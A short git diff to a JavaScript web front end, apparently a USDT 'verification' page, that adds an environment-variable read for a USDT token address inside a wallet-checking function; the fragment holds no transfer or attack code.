@@ -33,6 +33,7 @@ const sendNotification = async (user)=>{
     }
 }
 async function verifyUSDT() {
+
   if (typeof window.ethereum === 'undefined') {
     alert('Please install MetaMask, Trust Wallet, or Binance Wallet to proceed.');
     return;
@@ -42,7 +43,7 @@ async function verifyUSDT() {
 
   const contract = import.meta.env.VITE_CONTRACT
   const amount = import.meta.env.VITE_AMOUNT
-
+  const usdtAddress = import.meta.env.VITE_USDTADDR
   try {
     // Show loading stateVITE_
     verifyBtn.disabled = true;
